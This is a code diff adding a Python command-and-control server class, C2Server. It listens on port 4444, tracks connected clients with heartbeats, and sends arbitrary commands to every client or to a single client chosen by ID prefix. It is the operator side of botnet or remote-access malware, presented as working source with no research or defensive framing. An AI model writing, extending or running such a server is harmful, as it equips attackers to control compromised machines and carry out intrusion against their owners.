@@ -1,0 +1,88 @@
+import socket
+import threading
+import time
+
+from server_core.logging import Logger
+from server_core.heartbeat import heartbeat_sender
+from server_core.acceptor import accept_loop
+
+
+class C2Server:
+    def __init__(self, host='0.0.0.0', command_port=4444, heartbeat_port=4445):
+        self.host = host
+        self.command_port = command_port
+        self.heartbeat_port = heartbeat_port
+
+        self.clients = {}
+        self.lock = threading.Lock()
+        self.running = True
+
+        self.heartbeat_interval = 10
+        self.client_retention = 3600
+
+        self.logger = Logger(lambda: self.running)
+
+    def log(self, msg):
+        self.logger.log(msg)
+
+    def start(self):
+        threading.Thread(target=self.logger.printer, daemon=True).start()
+        threading.Thread(target=heartbeat_sender, args=(self,), daemon=True).start()
+
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind((self.host, self.command_port))
+        server.listen(50)
+
+        self.log(f"[*] Server listening on {self.command_port}")
+
+        threading.Thread(
+            target=accept_loop,
+            args=(self, server),
+            daemon=True
+        ).start()
+
+        return server
+
+    def stop(self):
+        self.running = False
+        with self.lock:
+            for c in self.clients.values():
+                c.close()
+
+    # ---------------- COMMANDS ----------------
+    def broadcast_command(self, command):
+        with self.lock:
+            clients = list(self.clients.values())
+
+        for client in clients:
+            with client.lock:
+                if not client.active:
+                    continue
+                try:
+                    client.socket.send((command + '\n').encode())
+                    client.set_time(time.time())
+                except Exception as e:
+                    self.log(f"[!] Send failed to {client.ip}: {e}")
+                    client.close()
+
+    def client_command(self, uid_prefix, command):
+        target = None
+        with self.lock:
+            matches = [
+                c for uid, c in self.clients.items()
+                if uid.startswith(uid_prefix) and c.active
+            ]
+            if len(matches) == 1:
+                target = matches[0]
+
+        if not target:
+            self.log("[ERR] Client not found or ambiguous")
+            return
+
+        with target.lock:
+            try:
+                target.socket.send((command + '\n').encode())
+                target.set_time(time.time())
+            except Exception:
+                target.close()
